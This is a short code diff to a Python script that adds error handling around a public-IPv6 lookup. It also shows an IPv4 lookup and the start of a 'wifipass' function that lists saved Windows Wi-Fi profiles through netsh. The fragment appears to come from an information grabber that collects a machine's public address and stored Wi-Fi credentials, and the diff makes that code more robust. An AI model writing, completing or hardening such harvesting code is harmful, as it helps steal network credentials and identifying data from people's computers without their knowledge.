@@ -77,12 +77,15 @@ def ip4():#Get ipv4
      with urlopen('https://4.tnedi.me') as response:
        return response.read().decode('ascii')
 def ip6():#get ipv6
+   try:
     try:
      with urlopen('https://6.ident.me') as response:
        return response.read().decode('ascii')
     except:
      with urlopen('https://6.tnedi.me') as response:
        return response.read().decode('ascii')
+   except:
+      return []
 def wifipass():
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
